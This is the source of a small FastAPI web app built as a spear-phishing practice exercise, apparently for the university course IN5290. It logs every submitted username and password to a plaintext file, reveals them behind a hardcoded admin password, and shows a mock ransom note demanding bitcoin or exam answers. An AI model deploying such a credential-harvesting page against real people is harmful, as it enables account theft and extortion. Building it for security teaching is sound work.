from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import os

app = FastAPI()

# Mount the static directory to serve images and other static files
app.mount("/static", StaticFiles(directory="static"), name="static")

# Path to the static image file
IMAGE_PATH = "static/map.png"
SECRET_MESSAGE = """
Hello Lazlo. The following Tesla locations have been leaked:
<ul>
    <li>University of Oslo</li>
    <li>Vettakollen</li>
    <li>Tesla Store</li>
</ul>

<p>In order to prevent the hackers from making this data public, please transfer <strong>20 bitcoin</strong>
to the following address:</p>
<p><a href="http://3cpo.hackingarena.com:805/index.php?fruit=banana"
target="_blank">http://3cpo.hackingarena.com:805/index.php?fruit=banana</a></p>

<p><strong>Special discount (only for Lazlo)!</strong><br>
Since the benevolent hackers knew that a poor university professor
can’t afford 20 bitcoin, there’s a limited offer.</p>
<p>Send the school exam with the solution in IN5290 autumn 2024 by
<em>1st of December</em> to avoid exposure of your sensitive data!</p>
"""

# File for storing credentials
CREDENTIALS_FILENAME = "captured_credentials.txt"
if not os.path.exists(CREDENTIALS_FILENAME):
    open(CREDENTIALS_FILENAME, "w").close()

# Initialize Jinja2 templates
templates = Jinja2Templates(directory="templates")


@app.get("/", response_class=HTMLResponse)
async def get_form(request: Request):
    warning_message = "This is a spear phishing email practice (IN5290 UiO). Do not type in your real password."
    return templates.TemplateResponse("index.html", {
        "request": request,
        "warning": warning_message
    })


@app.get("/image")
async def display_image():
    # Serve the image directly using FileResponse
    if os.path.exists(IMAGE_PATH):
        return FileResponse(IMAGE_PATH, media_type="image/png")
    else:
        return {"error": "Image not found"}


@app.post("/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...)):
    if username == "admin" and password == "admin_password":
        with open(CREDENTIALS_FILENAME, "r") as file:
            stored_credentials = file.readlines()
        message = "Displaying stored credentials"
        return templates.TemplateResponse("index.html", {
            "request": request,
            "message": message,
            "stored_credentials": stored_credentials
        })
    else:
        # Store non-admin credentials and display only the secret message once
        with open(CREDENTIALS_FILENAME, "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        success_message = f"Login successful! Welcome, {username}!"
        return templates.TemplateResponse("index.html", {
            "request": request,
            "success_message": success_message,
            "secret_message": SECRET_MESSAGE,
            "image_path": IMAGE_PATH
        })
